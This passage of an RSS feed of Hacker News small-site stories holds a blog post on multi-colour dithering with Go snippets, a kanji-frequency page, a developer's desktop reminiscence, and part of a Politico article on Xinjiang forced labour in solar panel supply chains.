<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 5]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 5. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Mon, 15 Feb 2021 08:35:35 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-5.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Mon, 15 Feb 2021 08:35:35 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[Ditherpunk 2 – beyond 1-bit]]>
            </title>
            <description>
<![CDATA[
Score 106 | Comments 27 (<a href="https://news.ycombinator.com/item?id=26120631">thread link</a>) | @makeworld
<br/>
February 12, 2021 | https://www.makeworld.gq/2021/02/dithering.html | <a href="https://web.archive.org/web/*/https://www.makeworld.gq/2021/02/dithering.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    <a rel="me" href="https://sunbeam.city/@makeworld"></a>
    <header>
        <h3><span>www.makeworld.gq</span></h3>
        <nav>
<a href="https://www.makeworld.gq/">Home</a>
<a href="https://www.makeworld.gq/about/">About</a>
<a href="https://www.makeworld.gq/blog/">Blog</a>

        </nav>
    </header>
    
    
    
    
    <p>Feb 12th, 2021<br>
by <strong>makeworld</strong></p>

<p><em>Last updated: Feb. 13, 2021</em></p>

<hr>

<p><em>This post contains some images that need to be viewed at 100% size to be seen correctly. If you normally browse
at a higher zoom level than 100%, please zoom out when you get to any of the images.</em></p>

<hr>

<p>Just yesterday, I released my <a href="https://github.com/makeworld-the-better-one/dither">dithering library</a>, written in Go.
It’s the product of many hours of research, experimentation, and refactoring. I’m
excited that it’s finally out, and to see what people create with it. Personally I’d like to create a CLI dithering
tool at some point that uses it.</p>

<p>Creating this library required research into the different algorithms for dithering, and how to implement them.
Unfortunately, not all of that knowledge is easily found. It’s spread across blog posts, Wikipedia pages without
citations, old books, and code comments. Recently, Surma wrote an article called
<a href="https://surma.dev/things/ditherpunk/">Ditherpunk — The article I wish I had about monochrome image dithering</a>.
It is an invaluable resource that combines lots of knowledge about dithering into one place. The main thing missing
from the post, however, is going beyond “monochrome”. Surma shows us how to dither with a 1-bit palette of black and
white, but what about more shades of gray? What about colour images? With this blog post I’d like to explore those
techniques, taking them out of my code and into English, so you can easily apply them elsewhere.</p>

<p><strong>First off, please read Surma’s post.</strong> It explains what dithering is, how it works, and many different algorithms.
I don’t feel the need to explain these again, but merely add on what I’ve learned.</p>

<h2 id="before-we-start">Before we start</h2>

<p>An HN commenter <a href="https://news.ycombinator.com/item?id=26122642">informed me</a> that you cannot accurately represent
linear RGB with just 8-bits (0-255), you need at least 12. Because of this, I have updated the blog post to use
16-bit color (0-65535), and will be updating the library shortly. Make sure you do this in your code too!</p>

<h2 id="overview">Overview</h2>

<p>Dithering operations consist of at least two steps, applied to each pixel. Sometimes there are further steps, like
“modify these nearby pixels”, but these are the basic ones.</p>

<ol>
  <li>Modify the pixel’s colour value.</li>
  <li>Find the colour in the palette that is “closest” to that modified value and use that on the output image.</li>
</ol>

<p>Now, we know from Surma’s post that step 1 must be done with linear RGB values. Otherwise, different values will be
affected differently – for example adding 5 to each colour won’t affect all colours the same way.</p>

<p>But what about step 2? How do we find the closest colour in the palette? In 1-bit dithering we don’t have to worry
about this, because anything above 0.5 is white, and anything below is black. But when your palette colours can be
anyhere in a 3D space, it is something that needs to be figured out.</p>

<p>Perhaps surprisingly, we’re not looking for a way that matches human perception. In fact, we are using Euclidean
distance with linear RGB values, which doesn’t match human perception at all! Why is this?
Thomas Mansencal (<a href="https://github.com/KelSolaar">@KelSolaar</a>) explains it best:</p>

<blockquote>
  <p>You can factor out the observer [the human] because what you are interested in here is basically energy
conservation. The idea being that for a given pool of radiant power emitters, if you remove a certain number of
them, by how much must the radiant power of the remaining ones be increased to be the same as that of the full
pool. It is really a ratio and doing those operations in a linear space is totally appropriate!</p>
</blockquote>

<p>This helped it click for me. Dithering can be thought of as trying to reconstruct the “radiant power” of the original
pixel colours, while restricted to a certain set of “emitters”, aka the palette colours. It is only with linearized
RGB values that we can properly measure the radiant power.</p>

<h2 id="random-noise-grayscale">Random Noise (grayscale)</h2>

<p>Random noise is a good one to start with, to show the differences between 1-bit dithering and larger palettes.</p>

<p>Surma does this by basically just adding a random number from -0.5 to 0.5, and then thresholding it.</p>

<div><div><pre><code><span>grayscaleImage</span><span>.</span><span>mapSelf</span><span>(</span><span>brightness</span> <span>=&gt;</span>
  <span>brightness</span> <span>+</span> <span>(</span><span>Math</span><span>.</span><span>random</span><span>()</span> <span>-</span> <span>0.5</span><span>)</span> <span>&gt;</span> <span>0.5</span> 
    <span>?</span> <span>1.0</span> 
    <span>:</span> <span>0.0</span>
<span>);</span>
</code></pre></div></div>

<p>In my library, there are two separate random noise functions. One is for grayscale, and one is for RGB. The grayscale
one looks like this:</p>

<div><div><pre><code><span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>gray</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>(</span><span>rand</span><span>.</span><span>Float32</span><span>()</span><span>*</span><span>(</span><span>max</span><span>-</span><span>min</span><span>)</span><span>+</span><span>min</span><span>))</span>
</code></pre></div></div>

<p>The math with <code>min</code> and <code>max</code> is just to put the random value in the desired range. If we clean that up it’s more
understandable:</p>

<div><div><pre><code><span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>gray</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>rand</span><span>())</span>
</code></pre></div></div>

<p><code>rand()</code> just represents a function that does whatever range we want, -0.5 to 0.5 in this case.</p>

<p>So, obviously this is quite similar to what Surma does. The heavy lifing of the dithering in this case is done by the
other code, the part that finds the best palette colour.</p>

<p>The main thing that’s worth noting here is how the rounding works. <code>roundClamp</code> rounds the value to an integer, and then
clamps it to the range 0-65535. But how is the rounding done?</p>

<p>Another <a href="https://news.ycombinator.com/item?id=26122642">HN commenter</a> shared <a href="http://www.cplusplus.com/articles/1UCRko23/">this link</a>
which discusses different rounding methods, and the problems with the way rounding is often done. The best solution is to
use a rounding function that does this:</p>

<blockquote>
  <p>Given a number exactly halfway between two values, round to the even value (zero is considered even here).</p>

  <p>round( 1.7 ) –&gt; 2 round( 2.7 ) –&gt; 3<br>
round( 1.5 ) –&gt; 2 round( 2.5 ) –&gt; 2<br>
round( 1.3 ) –&gt; 1 round( 2.3 ) –&gt; 2</p>
</blockquote>

<p>This is not really about dithering, but this is a pretty important point to get things right mathematically.
Make sure you do it! Otherwise your outputs will be biased.</p>

<h2 id="random-noise-rgb">Random Noise (RGB)</h2>

<p>Back to random noise, but for colour this time.</p>

<div><div><pre><code><span>r</span> <span>=</span> <span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>r</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>(</span><span>rand</span><span>.</span><span>Float32</span><span>()</span><span>*</span><span>(</span><span>maxR</span><span>-</span><span>minR</span><span>)</span><span>+</span><span>minR</span><span>))</span>
<span>g</span> <span>=</span> <span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>g</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>(</span><span>rand</span><span>.</span><span>Float32</span><span>()</span><span>*</span><span>(</span><span>maxG</span><span>-</span><span>minG</span><span>)</span><span>+</span><span>minG</span><span>))</span>
<span>b</span> <span>=</span> <span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>b</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>(</span><span>rand</span><span>.</span><span>Float32</span><span>()</span><span>*</span><span>(</span><span>maxB</span><span>-</span><span>minB</span><span>)</span><span>+</span><span>minB</span><span>))</span>
</code></pre></div></div>

<p>And simplified:</p>

<div><div><pre><code><span>r</span> <span>=</span> <span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>r</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>randR</span><span>())</span>
<span>g</span> <span>=</span> <span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>g</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>randG</span><span>())</span>
<span>b</span> <span>=</span> <span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>b</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>randB</span><span>())</span>
</code></pre></div></div>

<p>Pretty simple, it just adds randomness in each channel. This can be done with grayscale images too, but it won’t
work very well, because grayscale colours only actually have one dimension. So it will just not add as much
randomness as you would expect.</p>

<p>Also note that usually you’ll want the random ranges to be the same for R, G, and B.</p>

<p>Here’s an example:</p>

<section>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/peppers.png">
<figcaption>
Original image
</figcaption>
</figure>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/random_noise_rgb_red-green-black.png">
<figcaption>
Random Noise (palette is red, green, black)
</figcaption>
</figure>

</section>

<h2 id="ordered-dithering">Ordered Dithering</h2>

<h3 id="modifying-threshold-matrices">Modifying threshold matrices</h3>

<p>Most of the resources online that talk about ordered dithering talk about a “threshold matrix”. “Thresholding” is
how these matrices are applied for 1-bit dithering. You divide the matrix by whatever number is specified, scale
it to the colour value range, and compare it to each pixel in the image. If it’s less than the matrix value, make
it black, otherwise white. Obviously this doesn’t work with any other kind of palette. So what’s the solution?</p>

<p><a href="https://en.wikipedia.org/wiki/Ordered_dithering">Wikipedia</a> offers an answer. Unfortunately there’s no citation,
but I’ve confirmed independently that it works. Here it is with some of my own math added as well.</p>

<span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>65535</mn><mo>×</mo><mi>s</mi><mi>t</mi><mi>r</mi><mi>e</mi><mi>n</mi><mi>g</mi><mi>t</mi><mi>h</mi><mo stretchy="false">)</mo><mo>×</mo><mrow><mo fence="true">(</mo><mfrac><mrow><mi>c</mi><mi>e</mi><mi>l</mi><mi>l</mi><mo>+</mo><mn>1</mn></mrow><mrow><mi>m</mi><mi>a</mi><mi>x</mi></mrow></mfrac><mo>−</mo><mn>0.5</mn><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">(65535 \times strength) \times \left( \frac{cell + 1}{max} - 0.5 \right)</annotation></semantics></math></span></span></span>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>e</mi><mi>l</mi><mi>l</mi></mrow><annotation encoding="application/x-tex">cell</annotation></semantics></math></span></span> is a single cell of the matrix.</p>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mi>e</mi><mi>n</mi><mi>g</mi><mi>t</mi><mi>h</mi></mrow><annotation encoding="application/x-tex">strength</annotation></semantics></math></span></span> is a percentage, usually a float from <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span></span> to <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1.0</mn></mrow><annotation encoding="application/x-tex">1.0</annotation></semantics></math></span></span>. It’s the amount the matrix will be applied to the
image. The closer to zero it is, the smaller the range of input colors that will be dithered. Colors outside
that range will be quantized. Usually you’ll want a strength of <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1.0</mn></mrow><annotation encoding="application/x-tex">1.0</annotation></semantics></math></span></span>, to apply the matrix and dither fully, but
sometimes reducing it can be useful, to reduce noise in the output image. It is inversely proportional to contrast –
that is, when you reduce the <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mi>e</mi><mi>n</mi><mi>g</mi><mi>t</mi><mi>h</mi></mrow><annotation encoding="application/x-tex">strength</annotation></semantics></math></span></span>, it is visually similar to increasing the contrast.</p>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mi>e</mi><mi>n</mi><mi>g</mi><mi>t</mi><mi>h</mi></mrow><annotation encoding="application/x-tex">strength</annotation></semantics></math></span></span> can also be negative, from <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span></span> to <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mn>1.0</mn></mrow><annotation encoding="application/x-tex">-1.0</annotation></semantics></math></span></span>. This is useful in certain cases where the matrix usually
makes things bright, like what Surma describes with Bayer matrices.</p>

<p>Note that <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>65535</mn></mrow><annotation encoding="application/x-tex">65535</annotation></semantics></math></span></span> is multiplied by <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mi>e</mi><mi>n</mi><mi>g</mi><mi>t</mi><mi>h</mi></mrow><annotation encoding="application/x-tex">strength</annotation></semantics></math></span></span> because the colours in my code are in the range <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>65535</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0, 65535]</annotation></semantics></math></span></span>. If yours
are different you can change that number.</p>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>a</mi><mi>x</mi></mrow><annotation encoding="application/x-tex">max</annotation></semantics></math></span></span> is the value the entire matrix is divided by. It represents the maximum value of the matrix, and normalizes
it by dividing. Usually this is the product of the dimensions of the matrix. It can also be the
largest value in the matrix plus one.</p>

<p>The result of applying this operation to each cell of the matrix is a new, precalculated matrix, which can be added
to a pixel’s colour value for dithering. Adding 0.5 does not need to happen in this case. In my library, I call the
function that does this <code>convThresholdToAddition</code>, because that’s essentially the purpose of this – converting
a threshold matrix into one that can be used for addition.</p>

<p><strong>Note:</strong> This is designed for matrices that range from <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span></span> to <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>a</mi><mi>x</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">max - 1</annotation></semantics></math></span></span>. If you’re using a matrix you found that
starts at <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span></span>, you’ll usually just want to subtract one from each value when you program it, then apply the operation
I described above.</p>

<h3 id="using-a-modified-matrix">Using a modified matrix</h3>

<p>Now that you’ve modified the matrix so it can be used for addition, it needs to be applied to the image. This is pretty
simple. Use modulus so the matrix values are tiled across the image, and add the same value in the R, G, and B channels.
If you’re using a grayscale image you can just apply it in the one channel, or still use RGB. Since the same value is
being added it doesn’t make much of a difference. Like always, make sure to clamp the values to the proper colour range.</p>

<p>Doing all of this definitely works with colour images, but it’s not the greatest. Here’s an example, where the palette
is red, green, and black.</p>

<section>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/peppers.png">
<figcaption>
Original image
</figcaption>
</figure>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/bayer_16x16_red-green-black.png">
<figcaption>
Ordered dithering (Bayer 16x16)
</figcaption>
</figure>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/floyd-steinberg_red-green-black.png">
<figcaption>
Error diffusion dithering (Floyd-Steinberg)
</figcaption>
</figure>

</section>

<p>Here it is where the palette is red, green, black, and yellow.</p>

<section>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/bayer_16x16_red-green-yellow-black.png">
<figcaption>
Ordered dithering (Bayer 16x16)
</figcaption>
</figure>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/floyd-steinberg_red-green-yellow-black.png">
<figcaption>
Error diffusion dithering (Floyd-Steinberg)
</figcaption>
</figure>

</section>

<p>As you can see, it doesn’t really emulate any of the yellow in the first example, while Floyd-Steinberg can. Once yellow is added
to the palette it looks pretty good though.</p>

<h2 id="error-diffusion-dithering">Error diffusion dithering</h2>

<p>Error…</p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.makeworld.gq/2021/02/dithering.html">https://www.makeworld.gq/2021/02/dithering.html</a></em></p>]]>
            </description>
            <link>https://www.makeworld.gq/2021/02/dithering.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26120631</guid>
            <pubDate>Sat, 13 Feb 2021 01:29:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[With 777 Kanji, 90% Coverage of Kanji in the Wild]]>
            </title>
            <description>
<![CDATA[
Score 52 | Comments 26 (<a href="https://news.ycombinator.com/item?id=26120559">thread link</a>) | @sova
<br/>
February 12, 2021 | https://japanesecomplete.com/777 | <a href="https://web.archive.org/web/*/https://japanesecomplete.com/777">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <div>
            
            
            <p data-wow-delay="0.5s">With 777  of the most frequent kanji, one has 90.0% coverage of Kanji in the wild!</p>
            <p data-wow-delay="1.55s">With 1477 kanji one has 98.0% coverage, and with 2477 characters one has 99.9% coverage</p>
            <p data-wow-delay="3.05s">Based on the Balanced Corpus of Contemporary Japanese from 2011, these 777 kanji characters are the most frequent kanji in the Japanese language today.  By learning these kanji first, and in this order, one is maximizing their learning efficacy and will immediately see these kanji in native Japanese media, as they occur the most often across all domains (literature, poetry, science, politics, technology, television, novels, and more).</p>

          </div>
        </div></div>]]>
            </description>
            <link>https://japanesecomplete.com/777</link>
            <guid isPermaLink="false">hacker-news-small-sites-26120559</guid>
            <pubDate>Sat, 13 Feb 2021 01:15:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Screenshots from Developers: 2002 vs. 2015]]>
            </title>
            <description>
<![CDATA[
Score 24 | Comments 2 (<a href="https://news.ycombinator.com/item?id=26119769">thread link</a>) | @beliu
<br/>
February 12, 2021 | https://anders.unix.se/2015/12/10/screenshots-from-developers--2002-vs.-2015/ | <a href="https://web.archive.org/web/*/https://anders.unix.se/2015/12/10/screenshots-from-developers--2002-vs.-2015/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>How things have (and have not changed). I'm still a command-line junkie with at least two xterm windows open. I'm still using a 3x3 virtual desktop. However, instead of fvwm, it is now LXDE. I've also switched from FreeBSD to Linux and I'm running Lubuntu as my distribution.</p>

<p>There are a lot of indispensable GUI tools that I use. These include Firefox, lyx, Gimp, KeepassX, Shutter, viking, dia, Wireshark, calibre, audacity, Handbrake and VLC. But where possible I still prefer to script things. My main development languages are still shell, Perl and C.</p>

<p>My shell is now bash. The vi keystrokes are burned into my fingertips and, as long as vim can be ported to new systems, that will be my text editor until I pass on. My mail client is now mutt (definitely not a web client) and my mail is stored locally, not on someone else's server.</p>

<p>The only issue I have is that, since a job change, I now have to deal with Windoze things. Thus, I have VirtualBox, libreoffice and Wine to help me do that.</p>

<p>I started with Unix on a Pyramid 90x. I now have a smart phone that blows the 90x out of the water on performance, RAM and storage. But I'm so very happy that, somewhere down underneath, there is still a Bourne shell and an operating system that does open(), close(), read(), write(), fork() and exec()!</p>
</div></div>]]>
            </description>
            <link>https://anders.unix.se/2015/12/10/screenshots-from-developers--2002-vs.-2015/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26119769</guid>
            <pubDate>Fri, 12 Feb 2021 23:23:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Fears over China’s Muslim forced labor loom over EU solar power]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26119752">thread link</a>) | @ericdanielski
<br/>
February 12, 2021 | https://www.politico.eu/article/xinjiang-china-polysilicon-solar-energy-europe/ | <a href="https://web.archive.org/web/*/https://www.politico.eu/article/xinjiang-china-polysilicon-solar-energy-europe/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
									
							<div id="amazon-polly-audio-table">
				<p>Press play to listen to this article</p>
				
		</div>
<p>Nearly every solar power panel sold in the European Union has its origins in China’s <a href="https://www.politico.com/news/2020/07/24/china-uighurs-europe-sanctions-381080" target="_blank">oppressed Xinjiang region</a>.</p>



<p>The solar industry and Brussels lawmakers argue Europe’s renewable energy push should not come at a human cost amid long-standing international concern over reports China has <a href="https://www.reuters.com/article/us-china-rights-un-idUSKBN1KV1SU" target="_blank">detained 1 million people</a> with Muslim backgrounds in camps in Xinjiang and is putting them to work.</p>



<p>“Everybody knows what’s going on in China, and when facilities are based there you have to accept that there’s a high possibility that forced labor will be used,” said Milan Nitzschke, president of <a href="https://www.prosun.org/en/mission-en/" target="_blank">EU ProSun</a>, an alliance of solar businesses seeking to promote sustainable, solar manufacturing based in the EU.&nbsp;</p>



<p>While the U.S. has already rolled out sanctions against products such as cotton and tomatoes originating from Xinjiang, the European Commission has avoided confronting China with any trade measures. </p>



<p>It has fallen to lawmakers in the European Parliament to try to push Brussels to implement trade bans, on all industries including solar panels, if companies are implicated in human rights abuses.</p>



<p>“Import bans need to complement as a last resort if forced labor is involved in the production, like in Xinjiang," said Green MEP Anna Cavazzini.</p>



<h3>Suspicions about every panel</h3>



<p>For the past decade Beijing has been carrying out a campaign to <a href="https://www.politico.eu/?p=1256994">detain and “reeducate”</a> the Muslim-majority population of the Xinjiang region.</p>



<p>Human rights groups have alerted that state-run reeducation centers <a href="https://www.politico.eu/?p=1408155">double as forced labor camps</a>, with detained people obliged to work in low-skilled, labor-intensive sectors such as cotton picking. But recent reports out of the region suggest the Xinjiang government has also been focusing on “upskilling” the workforce and putting them to work in more specialized sectors.</p>



<p>That’s of particular concern to the global solar industry given Xinjiang’s outsized role in the production of <a href="https://www.politico.eu/?p=62601">polysilicon</a>, a material used to make photovoltaic (PV) cells.&nbsp;</p>



<p>“Nearly every silicon-based solar module — at least 95 percent of the market — is likely to have some Xinjiang silicon in,” said Jenny Chase, head of solar analysis at BloombergNEF.</p>



<p>Industry analyst Johannes Bernreuter added that last year roughly 45 percent of the global supply of solar-grade polysilicon came from the region.&nbsp;</p>



<p>Raw polysilicon is transported to factories — usually outside Xinjiang — and melted into cylinders, known as ingots. Because it’s blended with polysilicon produced in other regions, it’s difficult to trace material that could potentially come from forced labor camps in Xinjiang, Chase and Bernreuter said.</p>



<p>For any single solar panel “the mathematical probability is relatively high" it has some material produced in the province, said Bernreuter.</p>



<h3>An open secret</h3>



<p>Beijing <a href="https://www.reuters.com/article/china-cotton-forced-labour-trfn-idUSKBN28P2CM" target="_blank">insists</a> the camps — which it calls “vocational training facilities” — are simply “helping people of all ethnic groups secure stable employment” and argues that this is “entirely different from forced labor.”&nbsp;</p>



<p>The China Photovoltaic Industry Association <a href="http://www.chinapv.org.cn/association_news/922.html" target="_blank">said</a> accusations of forced labor in Xinjiang were ”the lie of the century fabricated by several institutions and people from Western countries.”</p>



<p>In Europe, industry players said the potential use of forced labor to produce material included in solar panels imported into the EU was an open secret.</p>



<p>Industry group SolarPower Europe said it was investigating the situation in Xinjiang with its membership and looking at different options to ensure no forced labor was used in the PV manufacturing process.&nbsp;</p>



<p>“We cannot accept that such practices take place in the solar PV sector, which is a leader in sustainability and a key enabler of the energy transition,” said SolarPower Europe CEO Walburga Hemetsberger.</p>



<p>The group said its members were using supply chain management guidelines, certifications and standards to ensure that forced labor was not used, and that it was evaluating how to encourage best practices across the industry.</p>



<h3>Distancing measures</h3>



<p>If the EU’s solar sector wants to distance itself from solar components manufactured under questionable circumstances in Xinjiang, it would have several ways of doing so.</p>



<p>Bloomberg NEF’s Chase said one option would be to continue accepting components made with polysilicon from China, but insisting that material produced in Xinjiang be exempted from the mix blended in factories.</p>



<p>“There’s plenty of non-Xinjiang polysilicon,” Chase said — around a quarter of the global market in 2021 is expected to come from the U.S. and the EU. But she said enforcing the exclusion would be complicated and likely make little difference for the plight of any workers. </p>



<p>Xinjiang polysilicon would simply shift to the domestic market and customers in the EU and the U.S. “will pay an almost unnoticeable amount more for modules,” said Chase. “Honestly, it is unlikely to be a big deal for solar, but good news for companies that make silicon outside Xinjiang.”</p>



<p>Perhaps unsurprisingly, European manufacturers believe the answer is repatriating the industry back to the EU and using tariffs if necessary.</p>



<p>“Solar components can be produced in Europe,” EU ProSun’s Nitzschke said. “The companies making them were here until 2012 but they went bankrupt when the tariffs used to address Chinese overproduction and public financing were removed, allowing their companies to undercut us in terms of price.”</p>



<p>Nitzschke argued the EU should revise its trade deals and ensure that the same standards on human rights and forced labor that apply in Europe be extended to imported products. “We can’t have a level playing field if there’s ethical leakage, and you could prevent it by applying tariffs to products that don’t meet our standards.”</p>



<p>SolarPower Europe’s Hemetsberger said she didn’t favor trade tariffs due to their often counterproductive effect on European solar growth. "The best way of ensuring that imported goods abide by strict human rights protocols and ethical standards is improving the level of transparency of the global value chain so that EU-based suppliers can make informed decisions."</p>



<p>The European Commission has said the EU’s solar capacity needs to <a href="https://ec.europa.eu/clima/policies/strategies/2030_en#:~:text=2030%20climate%20and%20energy%20framework%20%2D%20existing%20ambition,32.5%25%20improvement%20in%20energy%20efficiency" target="_blank">grow five-fold by 2030</a> to meet its climate targets. Hemetsberger said there was a “solar manufacturing renaissance” underway in Europe.</p>



<p>“Nearly all areas of the supply chain can be produced in Europe,” said Gunter Erfurt, CEO of <a href="https://www.meyerburger.com/en/company/about-meyer-burger/management/" target="_blank">Meyer Burger</a>, a Swiss-German solar module production company that aims to reestablish solar’s industrial supply chain on the Continent, pointing out that solar-grade polysilicon is <a href="https://www.wacker.com/cms/en-us/about-wacker/wacker-at-a-glance/profile-and-organization/wacker-polysilicon.html" target="_blank">already produced</a> at several sites in Germany.&nbsp;</p>



<p>“I have a lot of respect for the Chinese strategy because 10 years ago they understood what Europe is still struggling to grasp: that solar is the future,” he said. “EU leaders speak of batteries, electric mobility, hydrogen … But where is the electricity to produce those things supposed to come from? We are already the technological frontrunners, what we need now is financing to bring production back.”&nbsp;</p>



<h3>Growing pressure on Brussels</h3>



<p>Solar panels are yet another example of goods made with forced labor entering the EU market, raising <a href="https://www.politico.eu/?p=1572638">criticisms from lawmakers and NGOs</a>.&nbsp;</p>



<p>Joerg Wuttke, president of the EU Chamber of Commerce in China, expects the EU to step up scrutiny of imports from Xinjiang, including solar power panels.</p>



<p>“The pressure is piling on the Commission and member states that they have to use unilateral means to send China a message, such as screening of imported products,” said Wuttke.&nbsp;</p>



<p>Brussels <a href="https://www.politico.eu/article/eu-china-inestment-agreement-soft-approach-odds-us/">is taking its time</a> when its comes to tackling goods made with forced labor.&nbsp;</p>



<figure><img loading="lazy" width="1024" height="614" src="https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-1024x614.jpg" alt="" srcset="https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-1024x614.jpg 1024w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-300x180.jpg 300w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-768x461.jpg 768w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-1536x921.jpg 1536w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-714x428.jpg 714w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-406x242.jpg 406w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-1160x696.jpg 1160w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-380x228.jpg 380w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-115x69.jpg 115w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-200x120.jpg 200w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-433x260.jpg 433w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-60x36.jpg 60w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-1200x720.jpg 1200w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-333x200.jpg 333w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-1120x672.jpg 1120w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-600x360.jpg 600w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-1320x792.jpg 1320w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231.jpg 1979w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>A Meyer Burger engineer working on solar cells at a company site in Germany | Detlev Müller/Meyer Burger</figcaption></figure>



